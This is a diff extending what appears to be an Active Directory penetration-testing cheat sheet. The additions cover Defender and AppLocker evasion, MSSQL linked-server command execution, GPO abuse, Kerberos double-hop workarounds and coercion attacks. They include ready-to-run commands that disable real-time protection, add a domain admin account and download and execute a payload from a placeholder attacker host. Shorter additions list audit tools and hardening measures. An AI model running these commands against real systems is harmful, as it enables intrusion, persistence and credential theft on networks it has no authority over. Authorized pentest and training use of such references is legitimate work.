@@ -255,10 +255,45 @@ ldapsearch -H ldap://DC_IP -D "USER@DOMAIN" -w PASS -b "DC=domain,DC=local" "(ob
 python3 windapsearch.py --dc-ip DC_IP -u USER@DOMAIN -p PASS --da   # domain admins
 python3 windapsearch.py --dc-ip DC_IP -u USER@DOMAIN -p PASS -PU    # all privileged
 
+# DNS records via LDAP (adidnsdump — extracts ALL AD-integrated DNS):
+adidnsdump -u DOMAIN\\USER -p PASS DC_IP
+# Outputs records.csv — see internal hostnames, IPs, find lateral movement targets
+
 # Share pillaging (finds passwords in files):
 # Upload Snaffler.exe to MS01 and run:
 .\Snaffler.exe -s -d DOMAIN -o snaffler.log -v data
 # Finds: web.config files, .bat scripts, unattend.xml, password files, etc.
+```
+
+### Security Controls Recon — Check BEFORE Dropping Tools
+**When:** Immediately after getting code execution on any Windows host. Tells you what payloads will/won't run and what evasion you need.
+**Why:** Running Mimikatz or Rubeus when Defender is on = instant burn. Drop checks first, plan payloads second.
+
+```powershell
+# Windows Defender status:
+Get-MpComputerStatus | Select RealTimeProtectionEnabled, AntivirusEnabled, AMServiceEnabled
+# RealTimeProtection=False → drop signed binaries freely
+# True → use AMSI bypass, obfuscation, or LOLBins
+
+# Disable Defender (if you have admin):
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# AppLocker rules (check before dropping executables):
+Get-AppLockerPolicy -Effective -XML > applocker.xml
+# Look for: <FilePathRule> Allow rules — paths where you CAN execute
+# Common allow paths: C:\Windows\Temp, %USERPROFILE%\AppData\Local\Temp
+# Workaround: rename payload.exe → cmd.exe or place in allowed path
+
+# PowerShell Constrained Language Mode:
+$ExecutionContext.SessionState.LanguageMode
+# FullLanguage = OK, anything runs
+# ConstrainedLanguage = no .NET, no Add-Type, no Invoke-Expression on objects
+# Bypasses: PowerShell v2 (-Version 2), runspaces, or compile to .NET binary
+
+# LAPS deployed?
+Get-DomainComputer -Properties 'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime' | Where {$_.'ms-Mcs-AdmPwd'}
+# Property visible → you have LAPS read rights → free local admin passwords
+# Use: crackmapexec ldap DC_IP -u USER -p PASS -M laps
 ```
 
 ---
@@ -466,6 +501,12 @@ whoami /priv   # look for SeImpersonatePrivilege = Enabled
 **When:** You have MSSQL credentials (from web.config, password spray, etc.) and want OS command execution.
 
 ```bash
+# Discover MSSQL instances (PowerUpSQL — best discovery tool):
+Import-Module .\PowerUpSQL.ps1
+Get-SQLInstanceDomain                               # find all SQL servers in AD
+Get-SQLConnectionTest -Verbose                       # which ones can we auth to?
+Get-SQLServerInfo -Instance HOST                     # version, edition, sysadmin status
+
 # Connect:
 mssqlclient.py USER:PASS@HOST                       # SQL auth
 mssqlclient.py DOMAIN/USER:PASS@HOST -windows-auth # Windows auth
@@ -478,6 +519,58 @@ xp_cmdshell "certutil -urlcache -split -f http://ATTACKER_IP/tool.exe C:\Windows
 
 # NTLM coercion (force target to auth to us → Responder capture):
 xp_dirtree \\ATTACKER_IP\share   # forces MSSQL service to auth to us
+```
+
+### MSSQL Linked Servers — Pivot Between SQL Instances
+**When:** Compromised SQL server has linked server connections to other SQL hosts (often configured for cross-database queries with elevated rights).
+**Why:** Linked servers run queries on the remote SQL as a configured account — often `sa` or a privileged service account.
+
+```sql
+-- Find linked servers:
+SELECT srvname, isremote FROM sys.sysservers
+
+-- Run query on linked server (in mssqlclient.py):
+EXECUTE('SELECT @@version') AT [LINKED_SERVER]
+EXECUTE('SELECT system_user') AT [LINKED_SERVER]   -- who am I on the linked SQL?
+
+-- Enable xp_cmdshell ON the linked server:
+EXECUTE('sp_configure ''show advanced options'', 1; RECONFIGURE; sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SERVER]
+EXECUTE('xp_cmdshell ''whoami''') AT [LINKED_SERVER]
+
+-- Chain multiple hops:
+EXECUTE('EXECUTE(''xp_cmdshell ''''whoami'''''')  AT [HOP2]') AT [HOP1]
+```
+
+### Kerberos Double Hop Problem
+**When:** You SSH/WinRM into Host A as a domain user, then try to access Host B from Host A using the same user → access denied even though your creds are valid.
+**Why:** WinRM (and other network-auth scenarios) doesn't pass credentials to a third host by default. The user's TGT/TGS doesn't propagate.
+
+```powershell
+# Identify the problem:
+# - Works locally on Host A (whoami /priv shows correct user)
+# - Fails on Host B: "Access is denied" when running commands targeting Host B from Host A
+
+# Workaround 1 — PSCredential Object (re-supply creds explicitly):
+$pass = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USER', $pass)
+Invoke-Command -ComputerName HOST_B -Credential $cred -ScriptBlock { whoami }
+# Or for AD cmdlets:
+Get-DomainController -Credential $cred
+
+# Workaround 2 — Register a PSSession config (one-time setup on Host A, requires local admin):
+Register-PSSessionConfiguration -Name MyShell -RunAsCredential 'DOMAIN\USER'
+Restart-Service WinRM
+# Then connect with the saved credential:
+Enter-PSSession -ComputerName HOST_A -ConfigurationName MyShell
+# Now any command from this session has the creds attached
+
+# Workaround 3 — Use Pass-the-Ticket (avoid the problem entirely):
+.\Rubeus.exe asktgt /user:USER /password:PASS /ptt    # inject ticket into current session
+# Now everything uses Kerberos — no double-hop issue
+
+# Why RDP doesn't have this problem:
+# RDP creates an interactive logon (Type 2). Credentials stay in LSASS on the target,
+# so subsequent network access works. WinRM is network logon (Type 3) — no creds cached.
 ```
 
 ### NTLM Relay — No Cracking Needed
@@ -624,6 +717,14 @@ klist  # verify the ticket
 ls \\PARENT_DC\c$  # confirm access
 ```
 
+**Automated alternative — raiseChild.py (Impacket):**
+```bash
+# Does everything in one shot: DCSync krbtgt → enumerate SIDs → forge → DCSync parent
+raiseChild.py -target-exec PARENT_DC_IP CHILD.DOMAIN/USER:PASS
+# Outputs administrator NTLM hash from parent domain
+# Use the hash for PtH to PARENT_DC
+```
+
 ### Cross-Forest Kerberoasting
 **When:** There's a bidirectional forest trust. Your creds work in the foreign domain too.
 
@@ -705,6 +806,141 @@ Get-DomainUser -UACFilter PASSWD_NOTREQD -Properties samaccountname | Select-Obj
 GetNPUsers.py DOMAIN/ -usersfile users_no_pwd.txt -no-pass -dc-ip DC_IP
 ```
 
+### SYSVOL Script Hunting
+**When:** Always grep SYSVOL — admins frequently embed credentials in logon scripts, scheduled task wrappers, and config templates that get pushed via GPO.
+
+```bash
+# Mount SYSVOL and recursive grep:
+smbclient -U 'USER%PASS' //DC_IP/SYSVOL -c 'recurse; ls' > sysvol_listing.txt
+
+# From Windows attack host:
+ls \\DC_FQDN\SYSVOL\DOMAIN.LOCAL\scripts\         # logon scripts often here
+ls \\DC_FQDN\SYSVOL\DOMAIN.LOCAL\Policies\         # GPO content
+
+# Patterns to grep for:
+findstr /S /I "password" \\DC_FQDN\SYSVOL\*
+findstr /S /I "net use" \\DC_FQDN\SYSVOL\*         # mapped drives with creds
+findstr /S /I "cpassword" \\DC_FQDN\SYSVOL\*       # GPP password leftovers
+findstr /S /I "schtasks /create" \\DC_FQDN\SYSVOL\* # scheduled task creds
+```
+
+### GPO Abuse — Domain-Wide Code Execution
+**When:** BloodHound shows you have write rights on a GPO linked to a targeted OU (computers or users). One GPO push → command execution on every linked machine.
+**Why:** GPOs control startup/logon scripts, scheduled tasks, registry — anything the GP engine applies, you can weaponize.
+
+```powershell
+# Find GPOs you can edit:
+Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "Write" -and $_.SecurityIdentifier -match $YourSID}
+
+# Or via BloodHound: "Find GPOs that can be modified by the current user"
+
+# Abuse with SharpGPOAbuse:
+.\SharpGPOAbuse.exe --AddComputerTask \
+  --TaskName "Update" --Author NT AUTHORITY\SYSTEM \
+  --Command "cmd.exe" --Arguments "/c net user hacker P@ssw0rd /add /domain && net group 'Domain Admins' hacker /add /domain" \
+  --GPOName "Vulnerable GPO"
+
+# Add a user-context immediate task (runs on every user logon to linked OU):
+.\SharpGPOAbuse.exe --AddUserTask \
+  --TaskName "Update" --Author NT AUTHORITY\SYSTEM \
+  --Command "powershell.exe" --Arguments "-c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')" \
+  --GPOName "Vulnerable GPO"
+
+# Force GPO refresh on targets (or wait ~90 minutes):
+Invoke-GPUpdate -Computer TARGET -Force
+# Or from target: gpupdate /force
+```
+
+### Printer Bug (MS-RPRN Coercion)
+**When:** Print Spooler is exposed (commonly on DCs) and you control a host with HTTP/SMB listener. Forces the spooler service to authenticate to you as the machine account.
+
+```bash
+# Check if spooler is exposed:
+crackmapexec smb HOST -u USER -p PASS -M spooler
+
+# Coerce (Linux):
+python3 printerbug.py DOMAIN/USER:PASS@VICTIM_DC ATTACKER_IP
+# DC sends NTLM auth to ATTACKER_IP — capture with Responder or relay with ntlmrelayx
+
+# Coerce (alt — PetitPotam works on more targets, even with PrintSvc patched):
+python3 PetitPotam.py ATTACKER_IP VICTIM_IP
+python3 Coercer.py coerce -u USER -p PASS -t VICTIM_IP -l ATTACKER_IP    # tries all known methods
+```
+
+---
+
+## AD Auditing / Reporting Tools (Defensive Side — Pentest Deliverables)
+
+### AD Explorer (Sysinternals)
+**When:** You want a live GUI tree-view of AD for screenshots and quick attribute browsing.
+
+```
+Run as: .\ADExplorer.exe
+Connect: DC_IP, credentials, root domain
+File → Create Snapshot → save snapshot for offline analysis
+File → Compare Snapshots → diff two points in time (great for detecting changes)
+```
+
+### PingCastle — Quick AD Maturity Score
+**When:** Engagement deliverable — fast scan that produces an executive-friendly HTML report with a risk score (0-100).
+**Why:** Maps your findings to a graded score the client can show their board.
+
+```powershell
+.\PingCastle.exe --healthcheck --server DC_FQDN
+# Generates: ad_hc_DOMAIN.LOCAL.html + .xml
+# Score interpretation: 100 = critical, 0 = perfect (inverted)
+```
+
+Checks include: stale accounts, weak password policies, anonymous access, vulnerable trusts, ms-DS-MachineAccountQuota, KrbTgt password age, ACL anomalies.
+
+### Group3r — GPO-Focused Audit
+**When:** You want a deep audit of every GPO in the domain — finds GPP passwords, dangerous logon scripts, weak ACLs on GPOs.
+
+```powershell
+.\Group3r.exe -f group3r.log -o group3r-pretty.txt
+# Parses every GPO, checks ACLs, settings, attached scripts
+# Output is huge — grep for "FINDING" lines first
+```
+
+### ADRecon — Comprehensive AD Snapshot
+**When:** You want a single command that dumps an entire AD environment to an Excel workbook with 30+ tabs.
+
+```powershell
+.\ADRecon.ps1 -DomainController DC_FQDN -Credential DOMAIN\USER
+# Output: ADRecon-Report-<timestamp>\ADRecon-Report.xlsx
+# Tabs: Users, Computers, Groups, GPOs, OUs, Trusts, DCs, SPNs, Password Policy, etc.
+```
+
+### Tool Selection
+| Tool | Use For | Output |
+|------|---------|--------|
+| AD Explorer | Live browsing, screenshots | GUI |
+| PingCastle | Executive summary, risk score | HTML + score |
+| Group3r | Deep GPO audit, password hunting | TXT log |
+| ADRecon | Complete inventory for reports | Excel workbook |
+
+---
+
+## Hardening Quick Reference (Defensive Counter-TTPs)
+
+| Attack | Hardening |
+|--------|-----------|
+| LLMNR/NBT-NS poisoning | GPO: disable LLMNR + NetBIOS over TCP/IP |
+| Password spraying | Enforce 12+ char policy, account lockout, MFA, monitor 4625 |
+| Kerberoasting | Service accounts: 25+ char random passwords, AES-only, gMSA |
+| AS-REP Roasting | Remove `DONT_REQ_PREAUTH` from all accounts |
+| GPP cpassword | Remove vulnerable GPOs (KB2962486 patch) |
+| DCSync | Audit `DS-Replication-Get-Changes*` rights, monitor event 4662 |
+| LSASS dump | Credential Guard, RunAsPPL, disable WDigest |
+| NTLM relay | Require SMB signing + LDAP signing + Extended Protection |
+| Pass-the-Hash | Tier model (T0/T1/T2), no admin reuse across tiers, LAPS |
+| PrintNightmare | Disable Print Spooler on DCs |
+| PetitPotam | Disable RPC/EFS, enable EPA + signing |
+| NoPac | Patch CVE-2021-42278/42287, set `ms-DS-MachineAccountQuota=0` |
+| GPO Abuse | Restrict GPO write rights to T0 admins only |
+| ACL Abuse | Regular ACL audits, BloodHound from defender perspective |
+| ExtraSids trust | Enable SID Filtering on cross-domain trusts |
+
 ---
 
 ## Pivoting to Internal Networks
@@ -743,10 +979,16 @@ proxychains nmap -sT -p 445,5985 INTERNAL_IP
 | `GetNPUsers.py` | AS-REP Roast — no-preauth accounts | `GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass` |
 | `psexec.py` | SYSTEM shell (noisy, writes to disk) | `psexec.py DOMAIN/USER:PASS@HOST` |
 | `wmiexec.py` | User-context shell (stealthier) | `wmiexec.py DOMAIN/USER:PASS@HOST` |
+| `smbexec.py` | Service-based shell, no disk write | `smbexec.py DOMAIN/USER:PASS@HOST` |
 | `ticketer.py` | Forge Golden Ticket (Linux ExtraSids) | `ticketer.py -nthash KRBTGT -extra-sid EA_SID hacker` |
+| `raiseChild.py` | Automated child→parent ExtraSids attack | `raiseChild.py -target-exec PARENT_IP CHILD/USER:PASS` |
 | `lookupsid.py` | Get domain SID via RID brute force | `lookupsid.py DOMAIN/USER:PASS@DC_IP` |
 | `mssqlclient.py` | Connect to MSSQL server | `mssqlclient.py USER:PASS@HOST` |
 | `ntlmrelayx.py` | Relay NTLM auth to another host | `ntlmrelayx.py -tf targets.txt -smb2support` |
+| `getTGT.py` | Request TGT (Pass-the-Password/Hash/Key) | `getTGT.py DOMAIN/USER:PASS` |
+| `getST.py` | Request service ticket (S4U2Self/S4U2Proxy) | `getST.py -spn cifs/HOST DOMAIN/USER:PASS` |
+| `findDelegation.py` | Find delegation misconfigurations | `findDelegation.py DOMAIN/USER:PASS -dc-ip DC_IP` |
+| `GetLAPSPassword.py` | Read LAPS-managed local admin passwords | `GetLAPSPassword.py DOMAIN/USER:PASS@DC_IP` |
 
 ### Hashcat Modes — Quick Reference
 
